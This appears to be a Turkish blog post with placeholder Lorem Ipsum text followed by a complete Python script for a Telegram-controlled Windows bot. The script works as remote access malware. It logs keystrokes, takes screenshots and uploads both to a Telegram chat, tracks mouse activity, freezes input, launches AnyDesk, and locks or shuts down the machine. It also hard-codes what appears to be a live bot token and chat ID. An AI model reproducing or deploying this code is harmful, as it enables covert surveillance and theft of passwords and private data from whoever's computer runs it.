---
title: 'Örnek Site Başlığı'
date: 20-02-2025 21:33:49
author: Serdar
layout: post
permalink: /ornek-site-basligi/
categories: Genel
tags: [etiket1, etiket2]
---
Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.

```
from telegram import Update, Bot
from telegram.ext import CommandHandler, CallbackContext, Application
from apscheduler.schedulers.background import BackgroundScheduler
from pynput import mouse, keyboard
import subprocess
import pyautogui
import asyncio
import time
import os
import ctypes

#  ____ ___      .__       __________            
# |    |   \_____|  |  __ _\______   \ ____ ___.__.
# |    |   /  ___/  | |  |  \    |  _// __ <   |  |
# |    |  /\___ \|  |_|  |  /    |   \  ___/\___  |
# |______//____  >____/____/|______  /\___  > ____|
#              \/                  \/     \/\/2025   

# Bot token & chat-id
TOKEN = '7892474863:AAGz9fH80YHD24HkbJ79Vj8lJNObk1-g_aY'
CHAT_ID = '1475025892'
bot = Bot(token=TOKEN)

# Global değişkenler
last_activity_time = 0  # Son bildirim zamanını tutacak
is_monitoring_active = False  # İzleme durumu
mouse_listener = None
keyboard_listener = None
is_logging_active = False  # Keylogging durumu
logged_keys = []  # Kaydedilen tuşlar
scheduler = BackgroundScheduler()  # Zamanlayıcı
scheduler.start()  # Zamanlayıcıyı başlat

# Büyük harf kontrolü için durum değişkenleri
shift_pressed = False
capslock_active = False

# Fonksiyonlar
async def start(update: Update, context: CallbackContext):
    await update.message.reply_text('💻 Anydesk Başlat /anydesk')
    await update.message.reply_text('🎧 Kaydı Başlat /rec')
    await update.message.reply_text('📷 Ekran Görüntüsü /ss')
    await update.message.reply_text('🐭 Mouse Konumu /konum')
    await update.message.reply_text('👁 Mouse Radarı Aktif /aktif')
    await update.message.reply_text('👁‍🗨 Mouse Radarı Pasif /pasif')
    await update.message.reply_text('💀 K3yl0gger Aktif /logstart')
    await update.message.reply_text('🔴 K3yl0gger Pasif /logstop')
    await update.message.reply_text('❄️ Mouse ve Klavye Dondur /dondur')
    await update.message.reply_text('🔥 Mouse ve Klavye Çöz /coz')
    await update.message.reply_text('⚠️ Ekrana Mesaj Yaz /yaz MESAJ')
    await update.message.reply_text('🔒 Cihazı Kilitle /kilit')
    await update.message.reply_text('⚡️ Cihazı Kapat /kapat')


async def anydesk(update: Update, context: CallbackContext):
    try:
        subprocess.Popen(r'C:\Program Files (x86)\AnyDesk\AnyDesk.exe')
        await update.message.reply_text('💻 AnyDesk başlatıldı.')
        time.sleep(5)
    except Exception as e:
        await update.message.reply_text(f"⚠️ AnyDesk başlatılırken bir hata oluştu: {e}")


async def ss(update: Update, context: CallbackContext):
    filename = r"screenshot.png"
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        with open(filename, "rb") as file:
            await bot.send_photo(chat_id=CHAT_ID, photo=file)
        await update.message.reply_text("📷 Ekran Görüntüsü Alındı!")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Ekran görüntüsü alınırken bir hata oluştu: {e}")
    finally:
        if os.path.exists(filename):
            os.remove(filename)

async def konum(update: Update, context: CallbackContext):
    current_position = pyautogui.position()
    await update.message.reply_text(f"🐭 Konum: {current_position}")

async def kilit(update: Update, context: CallbackContext):
    await update.message.reply_text('🔒 Cihaz Kilitlendi')
    subprocess.run('rundll32.exe user32.dll,LockWorkStation', shell=True)

async def kapat(update: Update, context: CallbackContext):
    await update.message.reply_text('⚡️ Cihaz Kapatıldı')
    os.system("shutdown /s /t 0")

async def rec(update: Update, context: CallbackContext):
    subprocess.Popen(r'C:\Users\serdar\Desktop\Python\Telegram\sys_rec.bat')
    time.sleep(2)
    pyautogui.hotkey('ctrl', 'r')
    pyautogui.hotkey('win', 'm')
    subprocess.run('rundll32.exe user32.dll,LockWorkStation', shell=True)
    await update.message.reply_text('🎧 Kayıt başlatıldı.')

async def aktif(update: Update, context: CallbackContext):
    global is_monitoring_active, mouse_listener
    is_monitoring_active = True
    await update.message.reply_text('👁 Mouse Radarı Aktif!')
    # Mouse izleme başlat
    if not mouse_listener or not mouse_listener.running:
        mouse_listener = mouse.Listener(on_click=lambda x, y, button, pressed: on_activity())
        mouse_listener.start()

async def pasif(update: Update, context: CallbackContext):
    global is_monitoring_active, mouse_listener
    is_monitoring_active = False
    await update.message.reply_text('👁‍🗨 Mouse Radarı Pasif!')
    # Mouse izlemeyi durdur
    if mouse_listener and mouse_listener.running:
        mouse_listener.stop()

# Mouse ve klavye kontrolü için fonksiyonlar
async def dondur(update: Update, context: CallbackContext):
    global mouse_listener, keyboard_listener
    mouse_listener = mouse.Listener(suppress=True)
    keyboard_listener = keyboard.Listener(suppress=True)
    mouse_listener.start()
    keyboard_listener.start()
    await update.message.reply_text('❄️ Mouse ve Klavye Donduruldu!')

async def coz(update: Update, context: CallbackContext):
    global mouse_listener, keyboard_listener
    if mouse_listener:
        mouse_listener.stop()
    if keyboard_listener:
        keyboard_listener.stop()
    await update.message.reply_text('🔥 Mouse ve Klavye Çözüldü!')

async def yaz(update: Update, context: CallbackContext):
    message = ' '.join(context.args)
    if message:
        try:
            # Alt satıra geçmek için \n karakterini kullan
            message = message.replace('\\n', '\n')
            # Windows uyarı penceresi göster
            ctypes.windll.user32.MessageBoxW(0, message, "Uyarı", 0x30)
            await update.message.reply_text(f"🖥️ Uyarı Penceresi Gösterildi: {message}")
        except Exception as e:
            await update.message.reply_text(f"⚠️ Bir hata oluştu: {e}")
    else:
        await update.message.reply_text("⚠️ Lütfen bir mesaj giriniz.")

async def logstart(update: Update, context: CallbackContext):
    global is_logging_active, keyboard_listener, logged_keys
    if not is_logging_active:
        is_logging_active = True
        logged_keys = []
        keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        keyboard_listener.start()
        await update.message.reply_text('💀 K3yl0gger Başlatıldı!')

async def logstop(update: Update, context: CallbackContext):
    global is_logging_active, keyboard_listener
    if is_logging_active:
        is_logging_active = False
        if keyboard_listener:
            keyboard_listener.stop()
        await update.message.reply_text('🔴 K3yl0gger Durduruldu!')
        await save_and_send_logs()

def on_press(key):
    global logged_keys, shift_pressed, capslock_active
    try:
        if key.char:
            if shift_pressed or capslock_active:
                logged_keys.append(key.char.upper())
            else:
                logged_keys.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            logged_keys.append(' ')
        elif key == keyboard.Key.enter:
            logged_keys.append('\n')
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = True
        elif key == keyboard.Key.caps_lock:
            capslock_active = not capslock_active

def on_release(key):
    global shift_pressed
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = False

async def save_and_send_logs():
    global logged_keys
    log_file_path = "log.txt"
    with open(log_file_path, "w", encoding="utf-8") as log_file:
        log_file.write("".join(logged_keys))
  
    if os.path.exists(log_file_path):
        with open(log_file_path, "rb") as log_file:
            await bot.send_document(chat_id=CHAT_ID, document=log_file)
        os.remove(log_file_path)

async def notify_activity():
    global last_activity_time
    current_time = time.time()
  
    # 60 saniye içinde yalnızca bir bildirim gönder
    if current_time - last_activity_time >= 60:
        await bot.send_message(chat_id=CHAT_ID, text="👤 Bilgisayar kullanılmaya başlandı!")
        last_activity_time = current_time

def on_activity():
    # Fare hareketi veya tıklama algılandığında tetiklenen fonksiyon
    if is_monitoring_active:  # Yalnızca izleme aktifse bildirim gönder
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(notify_activity())

#def press_numlock():
#  pyautogui.press('pause')

def main():
    global last_activity_time
    pyautogui.FAILSAFE = False
    application = Application.builder().token(TOKEN).build()

    # Telegram komutları
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("anydesk", anydesk))
    application.add_handler(CommandHandler("rec", rec))
    application.add_handler(CommandHandler("ss", ss))
    application.add_handler(CommandHandler("konum", konum))
    application.add_handler(CommandHandler("aktif", aktif))
    application.add_handler(CommandHandler("pasif", pasif))
    application.add_handler(CommandHandler("logstart", logstart))
    application.add_handler(CommandHandler("logstop", logstop))
    application.add_handler(CommandHandler("dondur", dondur))
    application.add_handler(CommandHandler("coz", coz))
    application.add_handler(CommandHandler("yaz", yaz))
    application.add_handler(CommandHandler("kilit", kilit))
    application.add_handler(CommandHandler("kapat", kapat))
  
    # NumLock tuşu için zamanlayıcı
#   scheduler.add_job(press_numlock, 'interval', seconds=300)

    # Botu çalıştır
    application.run_polling()

if __name__ == '__main__':
    main()
```
